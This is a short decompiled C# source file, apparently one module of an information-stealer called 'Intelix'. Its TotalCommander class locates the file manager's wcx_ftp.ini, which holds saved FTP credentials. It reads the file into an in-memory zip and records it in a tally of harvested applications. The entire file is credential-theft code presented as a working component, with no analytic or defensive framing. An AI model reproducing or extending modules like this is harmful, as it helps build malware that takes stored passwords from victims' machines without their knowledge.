using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000054 RID: 84
	public class TotalCommander : ITarget
	{
		// Token: 0x0600010D RID: 269 RVA: 0x0000FC34 File Offset: 0x0000DE34
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "GHISLER", "wcx_ftp.ini");
			bool flag = File.Exists(text);
			if (flag)
			{
				string text2 = "Total Commander\\wcx_ftp.ini";
				zip.AddFile(text2, File.ReadAllBytes(text));
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Total Commander";
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
